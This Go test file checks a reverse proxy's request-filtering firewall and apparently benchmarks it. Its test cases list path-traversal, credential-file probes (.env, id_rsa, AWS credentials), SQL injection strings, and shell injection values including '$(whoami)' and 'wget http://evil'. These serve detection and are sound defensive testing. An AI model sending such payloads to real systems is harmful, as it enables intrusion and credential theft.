package guardian

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/ponzproxy/ponzproxy/internal/domain"
)

func allRules() *domain.Guardian {
	return &domain.Guardian{
		Mode:         domain.GuardianBlock,
		Rules:        domain.GuardianRules(),
		MaxURILength: 2048,
	}
}

func req(target string, headers ...string) *http.Request {
	r := httptest.NewRequest(http.MethodGet, "http://example.com"+target, nil)
	for i := 0; i+1 < len(headers); i += 2 {
		r.Header.Set(headers[i], headers[i+1])
	}
	return r
}

func TestBlocksKnownAttacks(t *testing.T) {
	cases := []struct {
		name   string
		target string
		agent  string
		rule   domain.GuardianRule
	}{
		{"plain traversal", "/files/../../etc/passwd", "", domain.RulePathTraversal},
		{"encoded traversal", "/files/%2e%2e%2fetc", "", domain.RulePathTraversal},
		{"double encoded traversal", "/files/%252e%252e%252fetc", "", domain.RulePathTraversal},
		{"backslash traversal", "/files/..\\windows", "", domain.RulePathTraversal},

		{"env file", "/.env", "", domain.RuleSensitiveFiles},
		{"env under a path", "/static/.env", "", domain.RuleSensitiveFiles},
		{"git config", "/.git/config", "", domain.RuleSensitiveFiles},
		{"ssh key", "/.ssh/id_rsa", "", domain.RuleSensitiveFiles},
		{"aws credentials", "/.aws/credentials", "", domain.RuleSensitiveFiles},
		{"database dump", "/backup/dump.sql", "", domain.RuleSensitiveFiles},

		{"union select", "/search?q=1+union+select+password", "", domain.RuleSQLInjection},
		{"tautology", "/login?user=admin'+or+'1'='1", "", domain.RuleSQLInjection},
		{"drop table", "/x?id=1;+drop+table+users", "", domain.RuleSQLInjection},
		{"schema probe", "/x?id=information_schema.tables", "", domain.RuleSQLInjection},
		{"time based", "/x?id=1+and+sleep(5)", "", domain.RuleSQLInjection},

		{"passwd read", "/cgi?cmd=;cat+/etc/passwd", "", domain.RuleShellInjection},
		{"subshell", "/cgi?x=$(whoami)", "", domain.RuleShellInjection},
		{"remote fetch", "/cgi?x=wget+http://evil", "", domain.RuleShellInjection},

		{"sqlmap", "/", "sqlmap/1.7", domain.RuleScannerAgents},
		{"nikto", "/", "Mozilla/5.0 (Nikto/2.5)", domain.RuleScannerAgents},
		{"wpscan", "/", "WPScan v3", domain.RuleScannerAgents},
	}

	g := allRules()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := req(tc.target)
			if tc.agent != "" {
				r.Header.Set("User-Agent", tc.agent)
			}
			v := Inspect(g, r)
			if !v.Matched {
				t.Fatalf("%q was not matched", tc.target)
			}
			if v.Rule != tc.rule {
				t.Errorf("matched %q, want %q", v.Rule, tc.rule)
			}
			if v.Detail == "" {
				t.Error("no detail recorded; the log would not say why")
			}
		})
	}
}

// TestOrdinaryTrafficIsNotMatched is the test that matters most. A firewall
// that refuses real customers is worse than none, because the failure is
// visible and the protection is not.
func TestOrdinaryTrafficIsNotMatched(t *testing.T) {
	targets := []string{
		"/",
		"/index.html",
		"/api/v1/orders?page=2&sort=created_at",
		"/products/shoes-size-12",
		"/search?q=how+to+select+a+union+representative",
		"/search?q=Bobby%20Tables",
		"/blog/2026/01/using-git-for-beginners",
		"/download/report.pdf?token=abc123def456",
		"/users/42/avatar.png",
		"/assets/app.4f2a9c.js",
		"/graphql?query=%7Buser%7Bname%7D%7D",
		"/a/very/deeply/nested/but/legitimate/path/to/a/file.json",
		"/search?q=caf%C3%A9",
		"/redirect?next=%2Fdashboard",
		// A dotfile that is not one of the sensitive ones.
		"/.well-known/acme-challenge/token123",
	}

	g := allRules()
	for _, target := range targets {
		t.Run(target, func(t *testing.T) {
			if v := Inspect(g, req(target)); v.Matched {
				t.Errorf("legitimate request refused by %s: %s", v.Rule, v.Detail)
			}
		})
	}
}

func TestOrdinaryUserAgentsPass(t *testing.T) {
	agents := []string{
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"curl/8.4.0",
		"Googlebot/2.1 (+http://www.google.com/bot.html)",
		"PostmanRuntime/7.36.0",
		"ponzproxy-health/1",
		"",
	}
	g := allRules()
	for _, a := range agents {
		if v := Inspect(g, req("/", "User-Agent", a)); v.Matched {
			t.Errorf("agent %q refused by %s", a, v.Rule)
		}
	}
}

func TestRulesAreIndependentlySwitchable(t *testing.T) {
	// Only the quiet rules on: an injection-looking query must pass.
	g := &domain.Guardian{
		Mode:  domain.GuardianBlock,
		Rules: []domain.GuardianRule{domain.RulePathTraversal, domain.RuleSensitiveFiles},
	}
	if v := Inspect(g, req("/x?id=1+union+select+2")); v.Matched {
		t.Errorf("SQL rule fired while switched off: %s", v.Detail)
	}
	if v := Inspect(g, req("/.env")); !v.Matched {
		t.Error("an enabled rule did not fire")
	}
}

func TestModeOffInspectsNothing(t *testing.T) {
	g := allRules()
	g.Mode = domain.GuardianOff
	if v := Inspect(g, req("/.git/config")); v.Matched {
		t.Error("inspection ran with the mode off")
	}
}

func TestControlCharactersAreRefused(t *testing.T) {
	g := allRules()
	// A null byte, percent-encoded so it survives request construction.
	if v := Inspect(g, req("/file%00.txt")); !v.Matched {
		t.Error("a null byte in the path was not matched")
	} else if v.Rule != domain.RuleControlCharacters {
		t.Errorf("matched %q, want control_characters", v.Rule)
	}
}

func TestOversizedTargetIsRefused(t *testing.T) {
	g := allRules()
	g.MaxURILength = 512
	long := "/" + strings.Repeat("a", 600)
	if v := Inspect(g, req(long)); !v.Matched {
		t.Error("an oversized request target was accepted")
	}

	// Zero disables the check.
	g.MaxURILength = 0
	if v := Inspect(g, req(long)); v.Matched {
		t.Errorf("the length check fired while disabled: %s", v.Detail)
	}
}

// TestScanningIsBounded proves a client cannot make the proxy scan an
// arbitrary amount of text per request.
func TestScanningIsBounded(t *testing.T) {
	g := allRules()
	g.MaxURILength = 0

	// Far past the scan limit, with the attack payload beyond it.
	huge := "/x?pad=" + strings.Repeat("a", maxScan*4) + "&q=union+select+1"
	v := Inspect(g, req(huge))
	if v.Matched {
		t.Log("matched despite the padding, which is fine — the point is it returned")
	}
	// The real assertion is that Inspect does not scan the whole string;
	// clamp is what guarantees that, and the benchmark below shows the cost
	// stays flat.
	if len(clamp(strings.Repeat("a", maxScan*4))) != maxScan {
		t.Error("clamp did not bound the scanned text")
	}
}

func TestDetailNeverEchoesTheRequest(t *testing.T) {
	g := allRules()
	payload := "/x?id=1+union+select+SUPERSECRETVALUE"
	v := Inspect(g, req(payload))
	if !v.Matched {
		t.Fatal("expected a match")
	}
	// The detail goes into logs an operator reads; it must name the
	// pattern, not carry whatever the attacker chose to send.
	if strings.Contains(strings.ToUpper(v.Detail), "SUPERSECRET") {
		t.Errorf("detail echoed the request: %q", v.Detail)
	}
}

// --------------------------------------------------------------- benchmarks

func BenchmarkInspectClean(b *testing.B) {
	g := allRules()
	r := req("/api/v1/orders?page=2&sort=created_at&filter=open")
	b.ReportAllocs()
	for b.Loop() {
		Inspect(g, r)
	}
}

func BenchmarkInspectMatch(b *testing.B) {
	g := allRules()
	r := req("/files/../../etc/passwd")
	b.ReportAllocs()
	for b.Loop() {
		Inspect(g, r)
	}
}

func BenchmarkInspectLongTarget(b *testing.B) {
	g := allRules()
	g.MaxURILength = 0
	r := req("/x?pad=" + strings.Repeat("a", 16384))
	b.ReportAllocs()
	for b.Loop() {
		Inspect(g, r)
	}
}

func BenchmarkInspectOff(b *testing.B) {
	g := allRules()
	g.Mode = domain.GuardianOff
	r := req("/api/v1/orders?page=2")
	b.ReportAllocs()
	for b.Loop() {
		Inspect(g, r)
	}
}

// BenchmarkInspectAtDefaultLimit is the worst case an operator actually runs:
// MaxURILength refuses anything longer before a byte is scanned.
func BenchmarkInspectAtDefaultLimit(b *testing.B) {
	g := allRules() // MaxURILength 2048
	r := req("/x?pad=" + strings.Repeat("a", 2000))
	b.ReportAllocs()
	for b.Loop() {
		Inspect(g, r)
	}
}

// BenchmarkInspectOversized is the request that gets refused on length alone,
// which must be the cheapest outcome of all.
func BenchmarkInspectOversized(b *testing.B) {
	g := allRules()
	r := req("/x?pad=" + strings.Repeat("a", 16384))
	b.ReportAllocs()
	for b.Loop() {
		Inspect(g, r)
	}
}
